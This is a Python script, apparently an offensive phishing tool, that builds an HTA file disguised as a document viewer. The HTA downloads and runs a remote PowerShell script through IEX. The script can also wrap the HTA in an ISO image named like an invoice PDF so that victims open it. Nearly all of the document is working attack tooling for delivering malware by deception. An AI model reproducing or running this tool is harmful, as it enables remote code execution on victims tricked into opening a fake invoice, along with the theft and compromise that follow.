#!/usr/bin/env python3
"""
HTA Payload Generator

Creates HTA file that looks like document viewer, runs PowerShell payload.
"""

import os
import sys
import argparse
import shutil
import subprocess
import tempfile


def create_hta_payload(payload_url: str, output_path: str, template_path: str = None):
    """Create HTA with embedded payload URL"""
    
    if template_path is None:
        template_path = os.path.join(os.path.dirname(__file__), '..', 'payloads', 'document_viewer.hta')
    
    with open(template_path, 'r') as f:
        hta_content = f.read()
    
    # Replace placeholder
    hta_content = hta_content.replace('%%PAYLOAD_URL%%', payload_url)
    
    with open(output_path, 'w') as f:
        f.write(hta_content)
    
    print(f"[+] Created: {output_path}")
    print(f"    Payload URL: {payload_url}")
    return True


def create_hta_iso(hta_path: str, iso_output: str, display_name: str = "Invoice_2025.pdf"):
    """Bundle HTA into ISO with document-like name"""
    
    # HTA extension
    if not display_name.lower().endswith('.hta'):
        display_name += '.hta'
    
    with tempfile.TemporaryDirectory() as tmpdir:
        # Copy HTA with display name
        dest = os.path.join(tmpdir, display_name)
        shutil.copy2(hta_path, dest)
        
        # Build ISO
        subprocess.run([
            'genisoimage', '-o', iso_output,
            '-V', 'DOCUMENTS', '-J', '-joliet-long', '-r',
            '-input-charset', 'utf-8', tmpdir
        ], capture_output=True)
        
        if os.path.exists(iso_output):
            size_kb = os.path.getsize(iso_output) / 1024
            print(f"[+] Created ISO: {iso_output} ({size_kb:.1f} KB)")
            print(f"    Contains: {display_name}")
            return True
    return False


def main():
    parser = argparse.ArgumentParser(description='HTA Payload Generator')
    parser.add_argument('url', help='Payload URL (PowerShell script to IEX)')
    parser.add_argument('-o', '--output', default='payload.hta', help='Output HTA file')
    parser.add_argument('--iso', help='Also create ISO with this name')
    parser.add_argument('-n', '--name', default='Invoice_2025', help='Display name in ISO')
    
    args = parser.parse_args()
    
    create_hta_payload(args.url, args.output)
    
    if args.iso:
        create_hta_iso(args.output, args.iso, args.name)


if __name__ == '__main__':
    main()
